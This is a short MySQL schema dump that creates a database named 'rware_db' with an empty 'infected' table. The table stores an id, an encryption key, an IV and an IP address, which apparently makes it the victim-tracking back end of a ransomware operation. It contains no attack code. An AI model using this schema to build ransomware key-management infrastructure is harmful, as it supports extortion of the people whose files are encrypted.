/*
Navicat MySQL Data Transfer

Source Server         : ubuntu 01 vm
Source Server Version : 50717
Source Host           : localhost:3306
Source Database       : rware_db

Target Server Type    : MYSQL
Target Server Version : 50717
File Encoding         : 65001

Date: 2017-05-15 21:18:55
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for infected
-- ----------------------------
DROP TABLE IF EXISTS `infected`;
CREATE TABLE `infected` (
  `id` varchar(255) NOT NULL,
  `key` text NOT NULL,
  `iv` text NOT NULL,
  `ip` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- ----------------------------
-- Records of infected
-- ----------------------------
SET FOREIGN_KEY_CHECKS=1;
